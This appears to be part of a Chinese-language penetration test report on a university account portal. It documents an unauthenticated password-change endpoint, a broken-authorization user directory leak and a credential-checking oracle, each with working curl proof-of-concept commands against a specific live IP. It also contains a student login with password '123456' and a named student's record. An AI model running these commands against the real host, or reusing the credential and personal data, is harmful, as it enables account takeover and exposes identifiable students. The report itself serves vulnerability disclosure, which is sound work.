## 🔴 #79 [high] 改密接口无会话鉴权 + 账号存在性 oracle

- **位置**：`POST https://210.43.112.9/api/account/changePwd`（门户改密页提交点）
- **要点**：username 由请求参数显式指定（非会话推导）；匿名（仅 CSRF salt cookie，从未登录）+ 假用户名 → HTTP 200 `{"code":1,"msg":"用户不存在"}`——请求直达用户存在性查询，无"需登录"拒绝；去掉 X-CSRF-Token 才被 400 拦（有 CSRF 门、**无认证门**）。
- **影响**：认证关键功能可匿名调用；账号存在性 oracle；与 #51 组成潜在匿名接管链（oracle 确认凭据 → changePwd 改密 → 门户上线 → 8080 换 Bearer）。**接管链未演示**（禁区不改密）。
- **PoC**：
  ```bash
  TOKEN=$(curl -sk -c j.txt https://210.43.112.9/api/csrf-token | sed 's/.*"csrf_token":"\([^"]*\)".*/\1/')
  curl -sk -b j.txt -X POST https://210.43.112.9/api/account/changePwd \
    -H "X-CSRF-Token: $TOKEN" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
    --data "username=pwnnonexist9999&password=x&newPassword=y&confirmPassword=y"
  # → {"code":1,"data":{},"msg":"用户不存在"}（匿名进入业务逻辑）
  ```
- **对照**：同请求去 X-CSRF-Token → HTTP 400 `CSRF token mismatch`（CSRF 门在、鉴权门缺）。
- **证据**：`evidence/66-changepwd-unauth-probe.txt`（含会话状态证明：cookie 仅 yudear、从未成功登录）＋ `evidence/66-changepwd-csrf-baseline.txt`
- **状态**：reported，待复测

## 🔴 #69 [high] userSearch BFLA——全校用户目录泄露

- **位置**：`GET 210.43.112.9:8080/v1/acl/userSearch?keyword=%20`
- **要点**：RoleId=0 普通学生 JWT → HTTP 200，`total=148` 全量用户目录，每条含 username、真实姓名、groupId、**MAC 地址（macAuth）**、policyId（如 `{"id":102728,"username":"20210470216","name":"罗阳琦",...}`）。该端点属管理侧 ACL 用户检索控件。
- **根因**：服务端仅做认证（匿名 → 401 Token无效），无角色/功能级授权（BFLA）。
- **影响**：148 名用户身份+设备标识泄露，可用于社工、定向攻击、绕过 MAC 认证。
- **PoC**：
  ```bash
  TOKEN=$(curl -sk -X POST https://210.43.112.9:8080/v1/login -H 'Content-Type: application/json' \
    -d '{"username":"20210470215","password":"123456"}' | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
  curl -sk -H "Authorization: Bearer $TOKEN" "https://210.43.112.9:8080/v1/acl/userSearch?keyword=%20"
  ```
- **对照**：同端点无 token → 401（鉴权在场、授权缺场的差异证明）。
- **证据**：`evidence/acl-usersearch.txt` ＋ `evidence/acl-baseline.txt`
- **修复建议**：acl/* 及管理端点补角色鉴权。
- **状态**：reported，待复测

## 🟠 #51 [medium] 匿名凭据验证三态 oracle

- **位置**：`POST 210.43.112.9/api/account/check`（登录前预检接口）
- **要点**：CSRF token 可匿名获取 → 接口匿名可达。三态可区分（CWE-204）：`用户不存在` / `用户密码错误` / `校验成功+isChangePwd`。
- **影响**：①任意用户名枚举；②密码正确性验证（绕过门户登录失败计数）；③泄露 isChangePwd（初始密码是否未改）——初始密码统一环境下可直接圈定可接管账号。限量探测未见锁定/限速（CWE-307 疑似，未规模化验证）。
- **PoC**：
  ```bash
  CSRF=$(curl -sk https://210.43.112.9/api/csrf-token | grep -oP '"csrf_token":"\K[^"]+')
  curl -sk -H "X-CSRF-Token: $CSRF" --data "username=20210470215&password=123456&nasId=1" \
    https://210.43.112.9/api/account/check   # → {"code":0,"isChangePwd":"1","msg":"校验成功"}
  ```
- **对照**：基线豁免（漏洞本质即同端点三态差异，错密码/假用户名响应已内含于证据）。
- **证据**：`evidence/step46-check-credential-oracle.txt`（A/B/C 三态完整实测）
- **状态**：reported，待复测
